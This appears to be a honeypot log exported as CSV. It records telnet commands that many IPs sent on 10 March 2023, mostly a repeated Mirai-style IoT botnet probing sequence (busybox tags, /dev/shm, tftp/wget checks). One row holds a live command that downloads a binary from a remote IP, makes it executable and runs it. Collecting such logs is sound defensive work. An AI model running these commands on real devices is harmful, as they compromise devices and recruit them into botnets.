@timestamp,input.keyword,src_ip,geoip.city_name,geoip.country_name
"Mar 10, 2023 @ 21:54:33.374",rm .s; exit,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:33.371",/bin/busybox RIQIC,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:33.090",while read i,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:33.088",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:32.802",tftp; wget; /bin/busybox RIQIC,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:32.517",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RIQIC,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:32.228",cat /proc/mounts; /bin/busybox RIQIC,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:31.943",sh,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:31.943",shell,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:31.942",shell,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:31.941",system,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:31.940",system,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:54:31.938",enable,36.104.222.34,Changchun,China
"Mar 10, 2023 @ 21:12:08.421",rm .s; exit,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:08.418",/bin/busybox WPUKO,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:08.178",while read i,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:08.175",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:07.932",tftp; wget; /bin/busybox WPUKO,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:07.691",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WPUKO,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:07.448",cat /proc/mounts; /bin/busybox WPUKO,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:07.208",sh,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:07.207",shell,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:07.206",shell,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:07.206",system,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:07.205",system,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:12:07.202",enable,149.113.219.137,-,United States
"Mar 10, 2023 @ 21:05:23.524",/bin/busybox LDWDD,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 21:05:23.323",while read i,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 21:05:23.321",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 21:05:23.109",tftp; wget; /bin/busybox LDWDD,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 21:05:22.907",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LDWDD,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 21:05:22.696",cat /proc/mounts; /bin/busybox LDWDD,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 21:05:22.492",sh,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 21:05:22.491",shell,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 21:05:22.490",shell,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 21:05:22.489",system,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 21:05:22.488",system,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 21:05:22.486",enable,121.224.132.3,Suzhou,China
"Mar 10, 2023 @ 20:12:14.063",rm .s; exit,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:14.059",/bin/busybox NZTSS,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:13.835",while read i,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:13.832",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:13.602",tftp; wget; /bin/busybox NZTSS,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:13.370",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NZTSS,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:13.135",cat /proc/mounts; /bin/busybox NZTSS,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:12.908",sh,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:12.907",shell,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:12.906",shell,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:12.906",system,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:12.905",system,110.182.240.122,-,China
"Mar 10, 2023 @ 20:12:12.903",enable,110.182.240.122,-,China
"Mar 10, 2023 @ 19:52:09.508",uname -a,34.100.196.131,-,United States
"Mar 10, 2023 @ 19:21:19.022",/bin/busybox VJVHG,113.26.83.201,-,China
"Mar 10, 2023 @ 19:21:18.779",while read i,113.26.83.201,-,China
"Mar 10, 2023 @ 19:21:18.776",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,113.26.83.201,-,China
"Mar 10, 2023 @ 19:21:18.525",tftp; wget; /bin/busybox VJVHG,113.26.83.201,-,China
"Mar 10, 2023 @ 19:21:18.264",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VJVHG,113.26.83.201,-,China
"Mar 10, 2023 @ 19:21:18.013",cat /proc/mounts; /bin/busybox VJVHG,113.26.83.201,-,China
"Mar 10, 2023 @ 19:21:17.767",sh,113.26.83.201,-,China
"Mar 10, 2023 @ 19:21:17.766",shell,113.26.83.201,-,China
"Mar 10, 2023 @ 19:21:17.765",shell,113.26.83.201,-,China
"Mar 10, 2023 @ 19:21:17.764",system,113.26.83.201,-,China
"Mar 10, 2023 @ 19:21:17.764",system,113.26.83.201,-,China
"Mar 10, 2023 @ 19:21:17.762",enable,113.26.83.201,-,China
"Mar 10, 2023 @ 18:57:33.708",rm .s; exit,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:33.695",/bin/busybox RQBTB,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:33.494",while read i,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:33.491",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:33.263",tftp; wget; /bin/busybox RQBTB,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:32.958",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RQBTB,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:32.738",cat /proc/mounts; /bin/busybox RQBTB,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:32.527",sh,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:32.526",shell,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:32.525",system,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:32.525",shell,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:32.524",system,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:57:32.522",enable,180.115.40.152,Changzhou,China
"Mar 10, 2023 @ 18:18:11.457",rm .s; exit,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:11.453",/bin/busybox AOAEM,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:11.261",while read i,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:11.258",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:11.059",tftp; wget; /bin/busybox AOAEM,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:10.861",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AOAEM,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:10.635",cat /proc/mounts; /bin/busybox AOAEM,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:10.437",sh,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:10.436",shell,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:10.436",shell,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:10.435",system,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:10.434",system,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:18:10.432",enable,222.93.242.99,Suzhou,China
"Mar 10, 2023 @ 18:17:36.525",rm .s; exit,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:36.513",/bin/busybox DRKCW,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:36.274",while read i,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:36.271",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:36.015",tftp; wget; /bin/busybox DRKCW,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:35.775",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DRKCW,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:35.463",cat /proc/mounts; /bin/busybox DRKCW,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:35.206",sh,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:35.204",shell,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:35.203",shell,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:35.201",system,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:35.200",system,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 18:17:35.198",enable,113.25.207.164,Zhongshan,China
"Mar 10, 2023 @ 17:00:15.427",rm .s; exit,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:15.418",/bin/busybox TPGZX,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:15.163",while read i,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:15.160",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:14.898",tftp; wget; /bin/busybox TPGZX,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:14.639",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TPGZX,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:14.375",cat /proc/mounts; /bin/busybox TPGZX,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:14.119",sh,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:14.118",shell,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:14.117",shell,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:14.116",system,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:14.115",system,110.180.153.131,-,China
"Mar 10, 2023 @ 17:00:14.113",enable,110.180.153.131,-,China
"Mar 10, 2023 @ 16:40:34.993",rm .s; exit,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:34.991",/bin/busybox KZGRX,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:34.757",while read i,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:34.754",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:34.516",tftp; wget; /bin/busybox KZGRX,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:34.279",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KZGRX,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:34.022",cat /proc/mounts; /bin/busybox KZGRX,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:33.787",sh,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:33.786",shell,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:33.786",shell,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:33.785",system,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:33.784",system,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:40:33.782",enable,183.15.91.89,Shenzhen,China
"Mar 10, 2023 @ 16:32:32.640",rm .s; exit,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:32.638",/bin/busybox GAOPP,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:32.437",while read i,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:32.434",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:32.230",tftp; wget; /bin/busybox GAOPP,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:32.028",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GAOPP,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:31.823",cat /proc/mounts; /bin/busybox GAOPP,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:31.622",sh,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:31.621",shell,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:31.621",shell,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:31.620",system,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:31.619",system,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:32:31.617",enable,49.168.22.221,-,South Korea
"Mar 10, 2023 @ 16:14:15.735",rm .s; exit,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:15.733",/bin/busybox QLCFH,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:15.486",while read i,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:15.483",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:15.231",tftp; wget; /bin/busybox QLCFH,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:14.978",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QLCFH,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:14.691",cat /proc/mounts; /bin/busybox QLCFH,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:14.443",sh,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:14.442",shell,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:14.442",shell,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:14.441",system,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:14.440",system,175.30.116.184,-,China
"Mar 10, 2023 @ 16:14:14.438",enable,175.30.116.184,-,China
"Mar 10, 2023 @ 15:57:40.578",rm .s; exit,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:40.568",/bin/busybox YPNEM,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:40.357",while read i,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:40.354",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:40.134",tftp; wget; /bin/busybox YPNEM,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:39.919",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YPNEM,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:39.689",cat /proc/mounts; /bin/busybox YPNEM,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:39.448",shell,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:39.448",sh,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:39.447",shell,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:39.446",system,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:39.445",system,180.118.216.230,-,China
"Mar 10, 2023 @ 15:57:39.443",enable,180.118.216.230,-,China
"Mar 10, 2023 @ 15:03:31.407",rm .s; wget http://1.77.61.195:46084/.i; chmod 777 .i; ./.i; exit,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:31.280",/bin/busybox JQRVF,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:31.154",while read i,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:31.150",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:31.025",tftp; wget; /bin/busybox JQRVF,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:30.897",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JQRVF,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:30.769",cat /proc/mounts; /bin/busybox JQRVF,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:30.644",sh,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:30.643",shell,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:30.642",system,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:30.642",shell,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:30.641",system,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 15:03:30.639",enable,190.109.236.80,La Paz,Bolivia
"Mar 10, 2023 @ 14:55:01.107",rm .s; exit,113.26.227.29,-,China
"Mar 10, 2023 @ 14:55:01.101",/bin/busybox UHMQI,113.26.227.29,-,China
"Mar 10, 2023 @ 14:55:00.854",while read i,113.26.227.29,-,China
"Mar 10, 2023 @ 14:55:00.851",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,113.26.227.29,-,China
"Mar 10, 2023 @ 14:55:00.600",tftp; wget; /bin/busybox UHMQI,113.26.227.29,-,China
"Mar 10, 2023 @ 14:55:00.343",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UHMQI,113.26.227.29,-,China
"Mar 10, 2023 @ 14:55:00.088",cat /proc/mounts; /bin/busybox UHMQI,113.26.227.29,-,China
"Mar 10, 2023 @ 14:54:59.832",sh,113.26.227.29,-,China
"Mar 10, 2023 @ 14:54:59.831",shell,113.26.227.29,-,China
